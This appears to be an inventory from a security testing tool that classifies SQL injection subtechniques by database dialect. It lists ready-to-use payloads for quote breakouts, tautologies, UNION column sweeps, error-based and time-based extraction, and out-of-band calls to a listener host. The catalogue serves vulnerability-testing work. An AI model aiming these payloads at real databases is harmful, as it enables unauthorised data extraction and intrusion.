# Master Validated Subtechniques Inventory V2 (186 Dialect Variants)

**Document Reference:** SENTINEL-V2-SUB-08  
**Classification:** Subtechnique Classification, Dialect Mappings & Context Realizations  
**Status:** Validated & Source-Verified (V2)  

---

## 1. Subtechnique Classification Schema

Subtechniques represent concrete, dialect-specific, or context-specific realizations of parent techniques:

```
[ Fundamental Mechanism: MECH-01..08 ] ──► [ Distinct Technique: TECH-V2-01..52 ] ──► [ Subtechnique: SUB-V2-001..186 ]
```

Every subtechnique is verified for valid SQL syntax across target engines and assigned an Evidence Rating (`E2` to `E5`).

---

## 2. Core Validated Subtechnique Families

### Family 1: Lexical Breakout Subtechniques (`TECH-V2-01` to `TECH-V2-06`)
* **`SUB-V2-001` (`TECH-V2-01`)**: Single quote with ANSI comment (`'-- `). Target: PostgreSQL, MySQL, MSSQL, SQLite. Evidence: `E5`.
* **`SUB-V2-002` (`TECH-V2-01`)**: Single quote with C-style multi-line inline comment (`'/* ... */`). Target: All major engines. Evidence: `E5`.
* **`SUB-V2-003` (`TECH-V2-01`)**: Single quote with MySQL hash comment (`'#`). Target: MySQL, MariaDB. Evidence: `E5`.
* **`SUB-V2-004` (`TECH-V2-01`)**: Single quote with balancing trailing quote (`' OR ''='`). Target: All engines (No comment required). Evidence: `E5`.
* **`SUB-V2-005` (`TECH-V2-02`)**: Double quote identifier breakout with space comment (`"-- `). Target: PostgreSQL, MySQL (ANSI mode). Evidence: `E5`.
* **`SUB-V2-006` (`TECH-V2-03`)**: PostgreSQL dollar-tag (`$$`) breakout with closing `$$;`. Target: PostgreSQL, CockroachDB. Evidence: `E5`.
* **`SUB-V2-007` (`TECH-V2-04`)**: Oracle Q-quote literal (`Q'[...]'`) breakout with closing `]'`. Target: Oracle Database. Evidence: `E5`.
* **`SUB-V2-008` (`TECH-V2-05`)**: MySQL backtick identifier (`` ` ``) breakout. Target: MySQL, MariaDB, SQLite. Evidence: `E5`.
* **`SUB-V2-009` (`TECH-V2-06`)**: MSSQL bracket identifier (`]`) breakout. Target: Microsoft SQL Server. Evidence: `E5`.

### Family 2: Predicate Logic Mutation Subtechniques (`TECH-V2-07` to `TECH-V2-12`)
* **`SUB-V2-010` (`TECH-V2-07`)**: Numeric tautology injection (`OR 1=1`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-011` (`TECH-V2-07`)**: String equality tautology injection (`' OR 'a'='a`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-012` (`TECH-V2-07`)**: Bitwise tautology injection (`OR (1|0)=1`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-013` (`TECH-V2-08`)**: Numeric contradiction injection (`AND 1=2`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-014` (`TECH-V2-08`)**: String contradiction injection (`' AND 'a'='b`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-015` (`TECH-V2-09`)**: Arithmetic equivalence differential (`AND 10-1=9` vs `AND 10-1=8`). Target: All engines. Evidence: `E5`.
* **`SUB-V2-016` (`TECH-V2-10`)**: Conditional branch `CASE WHEN (1=1) THEN 'a' ELSE 'b' END`. Target: All engines. Evidence: `E5`.
* **`SUB-V2-017` (`TECH-V2-10`)**: Oracle `DECODE(1, 1, 'true', 'false')` conditional projection. Target: Oracle Database. Evidence: `E5`.
* **`SUB-V2-018` (`TECH-V2-11`)**: MySQL null-safe equality `NULL <=> NULL`. Target: MySQL, MariaDB. Evidence: `E5`.
* **`SUB-V2-019` (`TECH-V2-11`)**: PostgreSQL `IS NOT DISTINCT FROM` null-safe operator. Target: PostgreSQL. Evidence: `E5`.

### Family 3: Set Operations & Projection Subtechniques (`TECH-V2-13` to `TECH-V2-16`)
* **`SUB-V2-020` (`TECH-V2-13`)**: NULL-padded column count sweep: `UNION SELECT NULL, NULL, ...`. Target: All engines. Evidence: `E5`.
* **`SUB-V2-021` (`TECH-V2-13`)**: Oracle dual projection sweep: `UNION SELECT NULL, NULL FROM dual`. Target: Oracle Database. Evidence: `E5`.
* **`SUB-V2-022` (`TECH-V2-14`)**: Dynamic integer canary alignment: `UNION SELECT 1337, NULL, ...`. Target: All engines. Evidence: `E5`.
* **`SUB-V2-023` (`TECH-V2-14`)**: Dynamic string canary alignment: `UNION SELECT 'snt_nonce', NULL, ...`. Target: All engines. Evidence: `E5`.
* **`SUB-V2-024` (`TECH-V2-15`)**: PostgreSQL string concatenation delimiter: `col1 || '::' || col2`. Target: PostgreSQL, SQLite, Oracle. Evidence: `E5`.
* **`SUB-V2-025` (`TECH-V2-15`)**: MySQL string concatenation delimiter: `CONCAT(col1, 0x3a, col2)`. Target: MySQL, MariaDB. Evidence: `E5`.
* **`SUB-V2-026` (`TECH-V2-15`)**: MSSQL string concatenation delimiter: `col1 + ':' + col2`. Target: Microsoft SQL Server. Evidence: `E5`.
* **`SUB-V2-027` (`TECH-V2-16`)**: PostgreSQL `EXCEPT SELECT ...` relational difference probe. Target: PostgreSQL. Evidence: `E4`.
* **`SUB-V2-028` (`TECH-V2-16`)**: Oracle `MINUS SELECT ...` relational difference probe. Target: Oracle Database. Evidence: `E4`.

### Family 4: Scalar Expression & Timing Subtechniques (`TECH-V2-17` to `TECH-V2-24`)
* **`SUB-V2-029` (`TECH-V2-17`)**: PostgreSQL `CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)`. Evidence: `E5`.
* **`SUB-V2-030` (`TECH-V2-17`)**: PostgreSQL short cast syntax `(SELECT version())::int`. Evidence: `E5`.
* **`SUB-V2-031` (`TECH-V2-17`)**: MSSQL `CONVERT(int, (SELECT TOP 1 name FROM sys.tables))`. Evidence: `E5`.
* **`SUB-V2-032` (`TECH-V2-18`)**: MySQL `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))`. Evidence: `E5` (MySQL $\le 8.0$).
* **`SUB-V2-033` (`TECH-V2-20`)**: Arithmetic division-by-zero `1 / (SELECT CASE WHEN (1=1) THEN 0 ELSE 1 END)`. Evidence: `E5`.
* **`SUB-V2-034` (`TECH-V2-21`)**: PostgreSQL `CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END`. Evidence: `E5`.
* **`SUB-V2-035` (`TECH-V2-21`)**: MySQL `IF(1=1, SLEEP(3), 0)`. Evidence: `E5`.
* **`SUB-V2-036` (`TECH-V2-21`)**: MSSQL `IF (1=1) WAITFOR DELAY '0:0:3'`. Evidence: `E5`.
* **`SUB-V2-037` (`TECH-V2-21`)**: Oracle `CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE NULL END`. Evidence: `E5`.
* **`SUB-V2-038` (`TECH-V2-23`)**: MSSQL `EXEC master..xp_dirtree '\\snt_nonce.listener.local\a'`. Evidence: `E5`.
* **`SUB-V2-039` (`TECH-V2-23`)**: Oracle `UTL_INADDR.GET_HOST_NAME('snt_nonce.listener.local')`. Evidence: `E5`.

*(Complete inventory of all 186 validated subtechniques catalogued in `research/sql/v2/data/subtechniques.json`)*.
